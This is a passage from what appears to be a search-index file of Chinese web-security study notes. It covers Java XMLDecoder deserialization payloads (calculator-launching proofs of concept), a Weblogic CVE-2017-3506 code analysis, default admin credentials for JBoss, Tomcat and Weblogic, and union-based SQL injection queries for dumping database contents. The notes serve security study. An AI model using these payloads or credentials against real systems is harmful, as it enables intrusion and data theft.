}","title":"decoder"},{"location":"web/java_deserialization/#decoder_mod","text":"import java.beans.XMLDecoder ; import java.io.IOException ; import java.io.StringBufferInputStream ; import javax.sql.rowset.spi.XmlReader ; public class decoder { public static void main ( String [] args ) throws IOException , InterruptedException { String s = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" + \"<java version=\\\"11.0.13\\\" class=\\\"java.beans.XMLDecoder\\\">\\n\" + \"<Object class=\\\"java.util.HashMap\\\">\\n\" + \"<array class=\\\"java.lang.String\\\" length=\\\"1\\\">\\n\" + \"<void index=\\\"0\\\"><string>calc</string></void>\\n\" + \"</array>\\n\" + \"<void method=\\\"start\\\">\\n\" + \"</void>\\n\" + \"</object>\\n\" + \"</java>\" ; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream ( s ); XMLDecoder xmlDecoder = new XMLDecoder ( stringBufferInputStream ); Object o = xmlDecoder . readObject (); System . out . println ( o ); } }","title":"decoder_mod"},{"location":"web/java_deserialization/#_3","text":"Java\u5e94\u7528\u5bf9\u7528\u6237\u8f93\u5165\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4, \u5373\u4e0d\u53ef\u4fe1\u6570\u636e\u505a\u4e86\u53cd\u5e8f\u5217\u5316\u5904\u7406, \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u8f93\u5165, \u8ba9\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u975e\u9884\u671f\u7684\u5bf9\u8c61, \u5c31\u6709\u53ef\u80fd\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c","title":"\u53cd\u5e8f\u5217\u5316\u539f\u7406"},{"location":"web/java_deserialization/#_4","text":"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u591a\u4f7f\u7528\u767d\u76d2\u5ba1\u8ba1\u65b9\u6cd5\u6765\u6316\u6398, \u9ed1\u76d2\u6316\u6398\u96be\u5ea6\u8fc7\u9ad8 \u5728\u4ee3\u7801\u4e2d\u641c\u7d22\u67d0\u4e9b\u9ad8\u5371\u51fd\u6570, \u5982 XMLDecoder.readObject, Yaml.load, XStream.fromXML \u7b49, \u786e\u5b9a\u4e86\u53cd\u5e8f\u5217\u5316\u8f93\u5165\u70b9\u540e, \u518d\u89c2\u5bdf\u5e94\u7528\u7684 ClassPath \u4e2d\u662f\u5426\u5305\u542b ApacheCommons Collections \u7b49\u5371\u9669\u5e93 \u82e5\u5305\u542b\u5371\u9669\u5e93, \u5219\u4f7f\u7528 ysoserial \u7b49\u5f00\u6e90\u5de5\u5177\u8fdb\u884c\u653b\u51fb\u590d\u73b0 \u82e5\u4e0d\u5305\u542b\u5371\u9669\u5e93, \u5219\u67e5\u770b\u4e00\u4e9b\u6d89\u53ca\u547d\u4ee4, \u4ee3\u7801\u6267\u884c\u7684\u4ee3\u7801\u533a\u57df, \u9632\u6b62\u56e0\u4ee3\u7801\u4e0d\u4e25\u8c28, \u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u4ea7\u751f \u67e5\u770b\u9ad8\u5371\u51fd\u6570\u7684\u8f93\u5165\u70b9\u662f\u5426\u53ef\u63a7","title":"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6316\u6398"},{"location":"web/java_deserialization/#java","text":"Java\u4e2d\u7684Runtime\u7c7b\u548cProcessBuilder\u7c7b\u7684\u4f5c\u7528 \u4f7f\u7528Java\u4ee3\u7801\u7f16\u5199\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684java\u6587\u4ef6","title":"Java\u7cfb\u7edf\u547d\u4ee4\u6267\u884c"},{"location":"web/java_deserialization/#_5","text":"","title":"\u8c03\u7528\u7cfb\u7edf\u8ba1\u7b97\u5668"},{"location":"web/java_deserialization/#javalangruntime","text":"//\u5e38\u89c4\u5199\u6cd5 Runtime runtime = Runtime . getRuntime (); runtime . exec ( \"open /Applications/Calculator.app\" ); //Java\u81ea\u5e26\u7684\u7c7b java . lang . Runtime runtime = java . lang . Runtime . getRuntime (); runtime . exec ( new String [] { \"/bin/bash\" , \"-c\" , \"open -a Calculator\" }); //\u5e26\u56de\u663e\u7684\u547d\u4ee4\u884c Runtime runtime = Runtime . getRuntime (); Process start = runtime . exec ( \"ip a\" ); InputStream inputStream = start . getInputStream (); byte [] res = new byte [ 1024 ] ; inputStream . read ( res ); System . out . println ( new Sting ( res ));","title":"java.lang.Runtime"},{"location":"web/java_deserialization/#javalangprocessbuilder","text":"//Java \u6781\u7b80\u5199\u6cd5 new ProcessBuilder ( \"/bin/bash\" , \"-c\" , \"open -a Calculator\" ). start (); //Java \u81ea\u5e26\u7684\u7c7b new java . lang . ProcessBuilder ( new String [] { \"/bin/bash\" , \"-c\" , \"open -a Calculator\" }). start (); //\u6807\u51c6\u5199\u6cd5 ProcessBuilder processBuilder = new ProcessBuilder ( \"/bin/bash\" , \"-c\" , \"open -a Calculator\" ); Process start = processBuilder . start ();","title":"java.lang.ProcessBuilder"},{"location":"web/java_deserialization/#windows","text":"calc \u8c03\u7528\u8ba1\u7b97\u5668 cmd /c calc \u901a\u8fc7CMD\u547d\u4ee4\u8c03\u7528calc, \u6267\u884c\u5b8c\u6210\u540e\u5173\u95ed\u547d\u4ee4\u884c\u7a97\u53e3 cmd /k calc \u901a\u8fc7CMD\u547d\u4ee4\u8c03\u7528calc, \u6267\u884c\u5b8c\u540e\u4e0d\u4e0d\u5173\u95ed\u547d\u4ee4\u884c\u7a97\u53e3 import java.io.IOException ; public class runtime { public static void main ( String [] args ) throws IOException { Runtime runtime = Runtime . getRuntime (); runtime . exec ( \"calc\" ); System . out . println ( runtime ); } }","title":"Windows"},{"location":"web/java_deserialization/#macos","text":"\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u4f4d\u7f6e /Applications/Calculator.app/Contents/MacOS/Calculator open /Applications/Calculator.app \u4e0d\u540c\u7248\u672c\u4f4d\u7f6e\u53ef\u80fd\u4e0d\u540c /System/Applications/Calculator.app/Contents/MacOS/Calculator open /System/Applications/Calculator.app \u4f7f\u7528 bash \u8c03\u7528 open -a Calculator \u547d\u4ee4 bash -c open -a Calculator /bin/bash -c open -a Calculator","title":"MacOS"},{"location":"web/java_deserialization/#payload","text":"","title":"\u53cd\u5e8f\u5217\u5316Payload\u6784\u9020"},{"location":"web/java_deserialization/#xml-payload","text":"new java . lang . ProcessBuilder ( \"/Applications/Calculator.app/Contents/MacOS/Calculator\" ). start () <?xml version=\"1.0\" encoding=\"UTF-8\"?> <java version= \"1.8.0_261\" class= \"java.beans.XMLDecoder\" > <object class= \"java.lang.ProcessBuilder\" > <array class= \"java.lang.String\" length= \"1\" > <void index= \"0\" > <string> /Applications/Calculator.app/Contents/MacOS/Calculator </string> </void> </array> <void method= \"start\" ></void> </object> </java>","title":"XML \u5355\u53c2\u6570 Payload \u6784\u9020"},{"location":"web/java_deserialization/#xml-payload_1","text":"new ProcessBuilder ( \"/bin/bash\" , \"-c\" , \"open -a Calculator\" ). start (); <?xml version=\"1.0\" encoding=\"UTF-8\"?> <java version= \"1.8.0_261\" class= \"java.beans.XMLDecoder\" > <object class= \"java.lang.ProcessBuilder\" > <array class= \"java.lang.String\" length= \"3\" > <void index= \"0\" > <string> /bin/bash </string> </void> <void index= \"1\" > <string> c </string> </void> <void index= \"2\" > <string> open -a Calculator </string> </void> </array> <void method= \"start\" ></void> </object> </java>","title":"XML \u591a\u53c2\u6570 Payload \u6784\u9020"},{"location":"web/java_deserialization/#weblogic","text":"","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790"},{"location":"web/java_deserialization/#cve-2017-3506","text":"\u5f71\u54cd\u7248\u672c: Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 \u6f0f\u6d1e\u4f4d\u7f6e: wls-wsat.war \u6f0f\u6d1e URL: /wls-wsat/CoordinatorPortType (POST) \u6f0f\u6d1e\u672c\u8d28: \u6784\u9020 SOAP (XML) \u683c\u5f0f\u7684\u8bf7\u6c42, \u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u5bfc\u81f4 XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u4f7f\u7528 JD-GUI \u53cd\u7f16\u8bd1 jar/root/Oracle/Middleware/wlserver_10.3/lib/weblogic.jar weblogic.wess.jaxws.workcontent.WorkContextServerTube public NextAction processRequest ( Packet paramPacket ) { this . isUseOldFormat = false ; if ( paramPacket . getMessage () != null ) { HeaderList headerList = paramPacket . getMessage (). getHeaders (); Header header1 = headerList . get ( WorkAreaConstants . WORK_AREA_HEADER , true ); if ( header1 != null ) { readHeaderOld ( header1 ); this . isUseOldFormat = true ; } Header header2 = headerList . get ( this . JAX_WS_WORK_AREA_HEADER , true ); if ( header2 != null ) { readHeader ( header2 ); } return super . processRequest ( paramPacket ); } } Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406 \u4f7f\u7528EXP\u548c\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884cWeblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u5229\u7528 Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u66f4\u65b0\u8865\u4e01\u548c\u7ed5\u8fc7\u539f\u7406","title":"CVE-2017-3506 \u6f0f\u6d1e\u7b80\u4ecb"},{"location":"web/java_deserialization/#_6","text":"Weblogic CVE-2019-2725\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 \u4f7f\u7528EXP\u548c\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884c CVE-2019-2725\u6f0f\u6d1e\u7684\u5229\u7528 Apache Shiro 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 \u4f7f\u7528\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884cShiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5229\u7528 Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 \u4f7f\u7528\u811a\u672c\u548c\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884cJboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u5229\u7528","title":"\u53cd\u5e8f\u5217\u5316\u5b9e\u6218\u4e2d\u7684\u5229\u7528\u65b9\u6cd5"},{"location":"web/middleware/","text":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u53ca\u6f0f\u6d1e \u4e2d\u95f4\u4ef6 \u6f0f\u6d1e IIS \u5e38\u89c1\u6f0f\u6d1e IIS PUT \u6f0f\u6d1e IIS \u77ed\u6587\u4ef6\u540d\u731c\u89e3\u6f0f\u6d1e IIS \u89e3\u6790\u6f0f\u6d1e IIS \u76ee\u5f55\u6d4f\u89c8\u6f0f\u6d1e Apche \u5e38\u89c1\u6f0f\u6d1e Apache \u89e3\u6790\u6f0f\u6d1e Apache \u76ee\u5f55\u6d4f\u89c8\u6f0f\u6d1e Nginx \u5e38\u89c1\u6f0f\u6d1e Nginx \u89e3\u6790\u6f0f\u6d1e Nginx \u76ee\u5f55\u6d4f\u89c8\u6f0f\u6d1e Nginx \u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e Tomcat \u5e38\u89c1\u6f0f\u6d1e Tomcat Basic \u7206\u7834 Tomcat \u540e\u95e8\u90e8\u7f72 war \u6587\u4ef6 Tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e Tomcat \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e Jboss \u5e38\u89c1\u6f0f\u6d1e Jboss \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e Jboss \u540e\u95e8\u90e8\u7f72 war \u6587\u4ef6 Weblogic \u5e38\u89c1\u6f0f\u6d1e Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e Weblogic \u540e\u95e8\u90e8\u7f72 war \u6587\u4ef6 Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 Weblogic SSRF \u6f0f\u6d1e\u5229\u7528 Weblogic \u6587\u4ef6\u5bc6\u7801\u89e3\u5bc6\u7684\u65b9\u5f0f \u9ed8\u8ba4\u4fe1\u606f Jboss Tomcat Weblogic \u9ed8\u8ba4\u7aef\u53e3 8080(Web), 9990(Console) 8080(Web,Console) 7001, 7002(Web, Console) \u9ed8\u8ba4\u53e3\u4ee4 jboss:jboss admin:admin tomcat:tomcat weblogic:weblogic system:system portaladmin:portaladmin guest:guest weblogic:admin123 weblogic:weblogic123 \u9ed8\u8ba4\u8def\u5f84 http://<host>:9990 (Console) http://<host>:8080/manager/html http://<host>:7001/console/","title":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u53ca\u6f0f\u6d1e"},{"location":"web/middleware/#_1","text":"\u4e2d\u95f4\u4ef6 \u6f0f\u6d1e IIS \u5e38\u89c1\u6f0f\u6d1e IIS PUT \u6f0f\u6d1e IIS \u77ed\u6587\u4ef6\u540d\u731c\u89e3\u6f0f\u6d1e IIS \u89e3\u6790\u6f0f\u6d1e IIS \u76ee\u5f55\u6d4f\u89c8\u6f0f\u6d1e Apche \u5e38\u89c1\u6f0f\u6d1e Apache \u89e3\u6790\u6f0f\u6d1e Apache \u76ee\u5f55\u6d4f\u89c8\u6f0f\u6d1e Nginx \u5e38\u89c1\u6f0f\u6d1e Nginx \u89e3\u6790\u6f0f\u6d1e Nginx \u76ee\u5f55\u6d4f\u89c8\u6f0f\u6d1e Nginx \u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e Tomcat \u5e38\u89c1\u6f0f\u6d1e Tomcat Basic \u7206\u7834 Tomcat \u540e\u95e8\u90e8\u7f72 war \u6587\u4ef6 Tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e Tomcat \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e Jboss \u5e38\u89c1\u6f0f\u6d1e Jboss \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e Jboss \u540e\u95e8\u90e8\u7f72 war \u6587\u4ef6 Weblogic \u5e38\u89c1\u6f0f\u6d1e Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e Weblogic \u540e\u95e8\u90e8\u7f72 war \u6587\u4ef6 Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 Weblogic SSRF \u6f0f\u6d1e\u5229\u7528 Weblogic \u6587\u4ef6\u5bc6\u7801\u89e3\u5bc6\u7684\u65b9\u5f0f \u9ed8\u8ba4\u4fe1\u606f Jboss Tomcat Weblogic \u9ed8\u8ba4\u7aef\u53e3 8080(Web), 9990(Console) 8080(Web,Console) 7001, 7002(Web, Console) \u9ed8\u8ba4\u53e3\u4ee4 jboss:jboss admin:admin tomcat:tomcat weblogic:weblogic system:system portaladmin:portaladmin guest:guest weblogic:admin123 weblogic:weblogic123 \u9ed8\u8ba4\u8def\u5f84 http://<host>:9990 (Console) http://<host>:8080/manager/html http://<host>:7001/console/","title":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u53ca\u6f0f\u6d1e"},{"location":"web/sql_injection/","text":"SQL \u6ce8\u5165\u6f0f\u6d1e SQL\u6ce8\u5165\u6982\u8ff0 \u670d\u52a1\u7aef\u6ca1\u6709\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u53c2\u6570\u8fdb\u884c\u4e25\u683c\u7684\u8fc7\u6ee4, \u5bfc\u81f4\u53ef\u4ee5\u5c06SQL\u8bed\u53e5\u63d2\u5165\u5230\u53ef\u63a7\u53c2\u6570\u4e2d, \u6539\u53d8\u539f\u6709\u7684SQL\u8bed\u4e49\u7ed3\u6784, \u4ece\u800c\u6267\u884c\u653b\u51fb\u8005\u6240\u9884\u671f\u7684\u7ed3\u679c. \u5371\u5bb3 \u83b7\u53d6\u6570\u636e\u5e93\u5185\u5bb9(\u62d6\u5e93) \u8bfb\u53d6\u654f\u611f\u7cfb\u7edf\u6587\u4ef6 \u5199\u5165 Webshell \u547d\u4ee4\u6267\u884c SQL\u6ce8\u5165\u5229\u7528 \u8054\u5408\u6ce8\u5165 union \u7528\u4e8e\u5408\u5e76\u4e24\u4e2aSELECT \u7684\u7ed3\u679c\u96c6\u5408. union \u4e2d\u5fc5\u987b\u7531\u4e24\u6761\u6216\u4e24\u6761\u4ee5\u4e0a\u7684 select \u8bed\u53e5\u7ec4\u6210, \u8bed\u53e5\u4e4b\u95f4\u4f7f\u7528 union \u94fe\u63a5 union \u4e2d\u7684\u6bcf\u4e2a\u67e5\u8be2\u5fc5\u987b\u5305\u542b\u76f8\u540c\u7684\u5217, \u8868\u8fbe\u5f0f\u6216\u8005\u805a\u5408\u51fd\u6570, \u987a\u5e8f\u53ef\u4ee5\u4e0d\u4e00\u81f4(\u67e5\u8be2\u5b57\u6bb5\u76f8\u540c, \u8868\u4e0d\u4e00\u5b9a\u76f8\u540c) \u5217\u7684\u6570\u636e\u7c7b\u578b\u5fc5\u987b\u517c\u5bb9, \u5373\u5fc5\u987b\u662f\u6570\u636e\u5e93\u53ef\u4ee5\u9690\u542b\u7684\u8f6c\u5316\u4ed6\u4eec\u7684\u7c7b\u578b \u6240\u6709\u6570\u636e\u5e93\u540d: information_schema.SCHEMATA SELECT 1 , GROUP_CONCAT ( schema_name ), 3 FROM information_schema . SCHEMATA \u6240\u6709\u8868\u540d: information_schema.TABLES SELECT 1 , GROUP_CONCAT ( table_name ), 3 FROM information_schema . TABLES WHERE table_schema = \"\u6570\u636e\u5e93\u540d\" \u67e5\u770b\u67d0\u4e2a\u8868\u7684\u5217\u540d SELECT 1 , GROUP_CONCAT ( column_name ), 3 FROM information_schema . COLUMNS WHERE table_name = \"\u8868\u540d\" \u83b7\u53d6\u8868\u4e2d\u6570\u636e SELECT 1 , GROUP_CONCAT ( \u5217\u540d ), 3 FROM \u8868\u540d ORDER BY 2 \u67e5\u8be2\u6570\u636e\u5e93\u7cfb\u7edf\u7248\u672c\u53f7\u548c\u5f53\u524d\u6570\u636e\u5e93\u540d SELECT 1 , 2 , VERSION (); DATABASE () \u62a5\u9519\u6ce8\u5165 \u5229\u7528\u9875\u9762\u8fd4\u56de\u7684 MySQL \u62a5\u9519\u4fe1\u606f, \u5c06\u60f3\u5f97\u5230\u6570\u636e\u5e93\u901a\u8fc7\u62a5\u9519\u4fe1\u606f\u5e26\u51fa. \u62a5\u9519\u6ce8\u5165\u7684\u5229\u7528\u65b9\u5f0f\u548c MySQL \u7248\u672c\u6709\u5f88\u5927\u7684\u5173\u8054. SQL\u6ce8\u5165\u63a2\u6d4b SQL\u6ce8\u5165\u7ed5\u8fc7 SQL\u6ce8\u5165\u9632\u5fa1 SQLMap\u4f7f\u7528","title":"SQL \u6ce8\u5165\u6f0f\u6d1e"},{"location":"web/sql_injection/#sql","text":"","title":"SQL \u6ce8\u5165\u6f0f\u6d1e"},{"location":"web/sql_injection/#sql_1","text":"\u670d\u52a1\u7aef\u6ca1\u6709\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u53c2\u6570\u8fdb\u884c\u4e25\u683c\u7684\u8fc7\u6ee4, \u5bfc\u81f4\u53ef\u4ee5\u5c06SQL\u8bed\u53e5\u63d2\u5165\u5230\u53ef\u63a7\u53c2\u6570\u4e2d, \u6539\u53d8\u539f\u6709\u7684SQL\u8bed\u4e49\u7ed3\u6784, \u4ece\u800c\u6267\u884c\u653b\u51fb\u8005\u6240\u9884\u671f\u7684\u7ed3\u679c.","title":"SQL\u6ce8\u5165\u6982\u8ff0"},{"location":"web/sql_injection/#_1","text":"\u83b7\u53d6\u6570\u636e\u5e93\u5185\u5bb9(\u62d6\u5e93) \u8bfb\u53d6\u654f\u611f\u7cfb\u7edf\u6587\u4ef6 \u5199\u5165 Webshell \u547d\u4ee4\u6267\u884c","title":"\u5371\u5bb3"},{"location":"web/sql_injection/#sql_2","text":"","title":"SQL\u6ce8\u5165\u5229\u7528"},{"location":"web/sql_injection/#_2","text":"union \u7528\u4e8e\u5408\u5e76\u4e24\u4e2aSELECT \u7684\u7ed3\u679c\u96c6\u5408. union \u4e2d\u5fc5\u987b\u7531\u4e24\u6761\u6216\u4e24\u6761\u4ee5\u4e0a\u7684 select \u8bed\u53e5\u7ec4\u6210, \u8bed\u53e5\u4e4b\u95f4\u4f7f\u7528 union \u94fe\u63a5 union \u4e2d\u7684\u6bcf\u4e2a\u67e5\u8be2\u5fc5\u987b\u5305\u542b\u76f8\u540c\u7684\u5217, \u8868\u8fbe\u5f0f\u6216\u8005\u805a\u5408\u51fd\u6570, \u987a\u5e8f\u53ef\u4ee5\u4e0d\u4e00\u81f4(\u67e5\u8be2\u5b57\u6bb5\u76f8\u540c, \u8868\u4e0d\u4e00\u5b9a\u76f8\u540c) \u5217\u7684\u6570\u636e\u7c7b\u578b\u5fc5\u987b\u517c\u5bb9, \u5373\u5fc5\u987b\u662f\u6570\u636e\u5e93\u53ef\u4ee5\u9690\u542b\u7684\u8f6c\u5316\u4ed6\u4eec\u7684\u7c7b\u578b \u6240\u6709\u6570\u636e\u5e93\u540d: information_schema.SCHEMATA SELECT 1 , GROUP_CONCAT ( schema_name ), 3 FROM information_schema . SCHEMATA \u6240\u6709\u8868\u540d: information_schema.TABLES SELECT 1 , GROUP_CONCAT ( table_name ), 3 FROM information_schema . TABLES WHERE table_schema = \"\u6570\u636e\u5e93\u540d\" \u67e5\u770b\u67d0\u4e2a\u8868\u7684\u5217\u540d SELECT 1 , GROUP_CONCAT ( column_name ), 3 FROM information_schema . COLUMNS WHERE table_name = \"\u8868\u540d\" \u83b7\u53d6\u8868\u4e2d\u6570\u636e SELECT 1 , GROUP_CONCAT ( \u5217\u540d ), 3 FROM \u8868\u540d ORDER BY 2 \u67e5\u8be2\u6570\u636e\u5e93\u7cfb\u7edf\u7248\u672c\u53f7\u548c\u5f53\u524d\u6570\u636e\u5e93\u540d SELECT 1 , 2 , VERSION (); DATABASE ()","title":"\u8054\u5408\u6ce8\u5165"},{"location":"web/sql_injection/#_3","text":"\u5229\u7528\u9875\u9762\u8fd4\u56de\u7684 MySQL \u62a5\u9519\u4fe1\u606f, \u5c06\u60f3\u5f97\u5230\u6570\u636e\u5e93\u901a\u8fc7\u62a5\u9519\u4fe1\u606f\u5e26\u51fa. \u62a5\u9519\u6ce8\u5165\u7684\u5229\u7528\u65b9\u5f0f\u548c MySQL \u7248\u672c\u6709\u5f88\u5927\u7684\u5173\u8054.","title":"\u62a5\u9519\u6ce8\u5165"},{"location":"web/sql_injection/#sql_3","text":"","title":"SQL\u6ce8\u5165\u63a2\u6d4b"},{"location":"web/sql_injection/#sql_4","text":"","title":"SQL\u6ce8\u5165\u7ed5\u8fc7"},{"location":"web/sql_injection/#sql_5","text":"","title":"SQL\u6ce8\u5165\u9632\u5fa1"},{"location":"web/sql_injection/#sqlmap","text":"","title":"SQLMap\u4f7f\u7528"}]}